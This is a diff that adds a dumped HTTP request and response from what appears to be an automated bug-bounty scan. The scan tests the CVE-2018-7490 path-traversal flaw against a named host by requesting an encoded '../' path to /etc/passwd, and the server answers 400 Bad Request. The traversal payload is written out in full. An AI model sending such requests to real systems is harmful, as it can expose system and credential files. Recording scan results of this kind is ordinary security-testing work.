@@ -1,0 +1,29 @@
+[CVE-2018-7490] Dumped HTTP request for http://akurateco.bitpanda.com/../../../../../../../etc/passwd
+
+
+GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
+Host: akurateco.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
+Connection: close
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2018-7490] Dumped HTTP response http://akurateco.bitpanda.com/../../../../../../../etc/passwd
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 150
+Content-Type: text/html
+Date: Tue, 05 Aug 2025 12:50:50 GMT
+
+<html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
